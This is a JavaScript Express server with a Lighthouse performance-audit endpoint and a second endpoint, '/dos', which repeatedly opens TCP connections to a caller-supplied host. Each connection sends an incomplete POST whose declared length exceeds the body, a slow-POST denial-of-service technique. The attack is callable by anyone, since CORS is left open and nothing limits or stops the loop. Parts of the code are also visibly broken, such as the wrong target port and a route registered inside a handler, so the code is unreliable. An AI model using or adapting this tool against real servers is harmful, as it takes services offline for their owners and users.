const express = require('express')
const lighthouse = require('lighthouse')
const chromeLauncher = require('chrome-launcher')
const cors = require('cors')
const net = require('net')
const path = require('path')
const app = express()
const port = 5050

app.use(cors())

app.get('/performance', async (req, res) => {
    try {
        let url = req.query.url

        if (!url) {
            throw new Error('Please provide url in the query params')
        }

        const chrome = await chromeLauncher.launch({
            chromeFlags: ['--headless'],
        })
        const options = {
            logLevel: 'info',
            output: 'html',
            port: chrome.port,
        }
        const runnerResult = await lighthouse(url, options)
        const response = JSON.stringify(runnerResult)

        res.send(response)
    } catch (err) {
        res.status(400)
        res.send(`Bad request  ${err}`)
    }
})

app.post('/dos', async (req, res) => {
    try {
        var maxConnections = 30
        var connections = []

        let host = req.query.url

        function Connection(h, p) {
            this.state = 'active'
            this.t = Date.now()

            this.client = net.connect({port: p, host: h}, () => {
                process.stdout.write('Connected, Sending... ')

                this.client.write(
                    'POST / HTTP/1.1\r\nHost: ' +
                    host +
                    '\r\n' +
                    'Content-Type: application/x-www-form-urlenconded\r\n' +
                    'Content-Length: 385\r\n\r\nvx=321&d1=fire&l',
                )

                process.stdout.write('Written.\n')
            })
            this.client.on('data', (data) => {
                this.client.end()
            })
            this.client.on('end', () => {
                var d = Date.now() - this.t
                this.state = 'ended'

        
            })
            this.client.on('error', () => {
                this.state = 'error'
            })

            connections.push(this)
        }

        setInterval(() => {
            var notify = false

            // Add another connection if we haven't reached
            // our max:
            if (connections.length < maxConnections) {
                new Connection(host, port)
                notify = true
            }

            // Remove dead connections
            connections = connections.filter(function (v) {
                return v.state == 'active'
            })

            if (notify) {
                console.log(
                    'Active connections: ' + connections.length + ' / ' + maxConnections,
                )
            }
        }, 500)
    } catch (err) {
        res.status(400)
        res.send(`Bad request ${err}`)
    }
    app.get('/mocks/exampleTestPage', function (_, res) {
        res.sendFile(path.join(__dirname, 'mocks', 'exampleTestPage.html'))
    })
});

app.listen(port, () => {
    console.log(`Example app listening at http://localhost:${port}`)
})
